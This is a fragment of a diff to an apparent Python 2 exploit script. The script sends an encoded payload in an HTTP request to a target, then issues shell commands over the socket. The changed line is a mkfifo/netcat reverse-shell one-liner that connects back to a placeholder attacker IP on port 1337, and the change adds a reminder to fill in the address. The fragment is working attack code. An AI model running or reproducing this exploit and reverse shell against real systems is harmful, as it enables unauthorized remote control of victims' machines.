@@ -76,7 +76,7 @@ s.send("GET /"+urllib.quote_plus(payload)+" HTTP/1.1\r\nHost: "+HOST+"\r\n\r\n")
 print s.recv(1024)
 s.send("whoami"+"\n")
 print s.recv(1024)
-s.send("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "YOUR IP"  1337 >/tmp/f"+"\n")
+s.send("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "YOUR IP"  1337 >/tmp/f"+"\n") #Don't miss to edit this part !!!
 print s.recv(1024)
 s.send("pwd"+"\n")
 print s.recv(1024)
